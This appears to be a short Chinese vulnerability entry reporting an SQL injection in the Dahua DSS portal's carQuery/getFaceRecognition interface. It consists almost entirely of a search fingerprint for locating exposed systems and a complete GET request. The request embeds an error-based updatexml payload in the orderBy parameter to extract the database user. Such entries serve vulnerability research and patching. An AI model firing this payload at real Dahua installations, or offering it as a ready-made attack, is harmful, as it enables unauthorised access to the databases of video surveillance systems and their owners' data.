# 大华DSS-portal接口存在SQL注入漏洞

大华 ｜ SQL注入 ｜ —
- **指纹**：`app="dahua-DSS"`
- **请求**：`GET /portal/services/carQuery/getFaceRecognition/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/1 HTTP/1.1`